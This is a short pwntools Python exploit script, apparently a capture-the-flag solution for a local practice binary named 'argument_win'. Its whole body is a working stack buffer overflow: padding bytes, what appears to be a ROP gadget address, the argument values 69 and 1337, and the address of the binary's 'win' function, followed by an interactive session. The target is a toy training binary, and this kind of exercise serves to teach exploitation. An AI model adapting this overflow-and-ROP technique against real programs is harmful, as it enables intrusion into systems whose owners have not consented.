#!/usr/bin/python3
from pwn import *

exe = './argument_win'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x00000000004011bc
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.sendline(b"A"*10 + b"B"*8 + p64(0x0000000000401156) + p64(69) + p64(1337) + p64(elf.sym.win))

p.interactive()
